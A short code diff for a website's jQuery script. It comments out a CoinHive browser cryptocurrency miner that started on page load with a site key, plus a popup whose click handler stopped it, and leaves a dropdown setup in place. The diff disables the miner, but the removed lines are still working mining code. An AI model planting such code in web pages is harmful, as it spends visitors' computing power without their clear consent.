@@ -5,25 +5,25 @@
  */
 
 $(document).ready(function () {
-	var miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
-		autoThreads: true,
-		theme: 'dark',
-		threads: 1,
-		throttle: 0.8,
-		language: 'auto'
-	});
-	miner.start();
+	/*let miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
+ 	autoThreads: true,
+ 	theme: 'dark',
+ 	threads: 1,
+ 	throttle: 0.8,
+ 	language: 'auto'
+ });
+ miner.start();*/
 
-	var $el = $('#popupMiner');
-
-	$el.on('click', function () {
-		$el.hide();
-		miner.stop();
-	});
-
-	miner.on('open', function () {
-		$el.show();
-	});
+	/*let $el = $('#popupMiner');
+ 
+ $el.on('click', function () {
+ 	$el.hide();
+ 	miner.stop();
+ });
+ 
+ miner.on('open', function () {
+ 	$el.show();
+ });*/
 
 	$('.dropdown').dropdown({
 		action: 'hide'
